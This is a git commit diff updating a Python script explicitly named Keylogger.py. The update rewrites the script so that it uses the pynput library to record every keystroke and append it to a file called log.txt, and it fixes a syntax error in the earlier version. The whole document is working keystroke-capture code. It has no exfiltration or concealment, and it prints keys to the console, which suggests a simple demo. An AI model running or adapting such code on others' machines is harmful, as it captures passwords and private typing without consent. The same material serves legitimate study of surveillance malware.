0f16df5e0fb81f0dcc57be1898768ad711ccd6c2
Aakash Bogu <aakashdass67@gmail.com>
2026-03-19 21:38:25 +0500

    Update Keylogger.py
    updated the verion

--- Keylogger/Keylogger.py
+++ Keylogger/Keylogger.py
@@ -1,41 +1,29 @@
-# keylogger using pynput module
- 
-import pynput
 from pynput.keyboard import Key, Listener
- 
+
 keys = []
- 
+
 def on_press(key):
-    
-    keys.append(key)
-    write_file(keys)
-    
+    write_file(key)
+
     try:
         print('alphanumeric key {0} pressed'.format(key.char))
-        
     except AttributeError:
         print('special key {0} pressed'.format(key))
-         
-def write_file(keys):
-    
-    with open('log.txt', 'w') as f:
-        for key in keys:
-            
-            # removing ''
-            k = str(key).replace("'", "")
-            f.write(k
-                    
-            f.write(' ') 
-             
+
+
+def write_file(key):
+    with open('log.txt', 'a') as f:
+        if hasattr(key, 'char') and key.char is not None:
+            f.write(key.char)
+        else:
+            f.write(f' [{key}] ')
+
+
 def on_release(key):
-                    
     print('{0} released'.format(key))
     if key == Key.esc:
-      
         return False
- 
- 
-with Listener(on_press = on_press,
-              on_release = on_release) as listener:
-                    
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
